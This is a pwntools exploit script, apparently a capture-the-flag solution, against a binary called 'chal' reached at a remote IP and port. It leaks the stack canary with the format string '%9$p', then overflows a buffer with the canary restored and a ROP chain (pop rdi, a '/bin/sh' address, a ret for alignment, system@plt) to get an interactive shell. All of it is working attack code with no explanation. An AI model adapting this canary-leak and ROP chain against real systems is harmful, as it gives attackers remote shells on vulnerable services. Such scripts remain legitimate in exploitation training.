from pwn import *

# io = process("./chal")
io = remote("35.228.220.66",1301)
elf = ELF("./chal")
r = ROP("./chal")

io.recvline()

io.sendlineafter(": ","%9$p")  #leaking the canary
io.recvline()
leak = int(io.recvline().strip(),16)   


RET = r.find_gadget(["ret"]).address
RDI = r.find_gadget(["pop rdi","ret"]).address

payload = b"leave" +  b"A" * 67  # Offset to return address
payload += p64(leak) # Bypassing Canary
payload += p64(0x0)  # Saved rbp
payload += p64(RDI)
payload += p64(elf.symbols["help"])  # Address of "/bin/sh" string
payload += p64(RET)  # Padding for alignment
payload += p64(elf.plt.system)  # Address of the system function

io.sendlineafter(": ",payload)

io.interactive()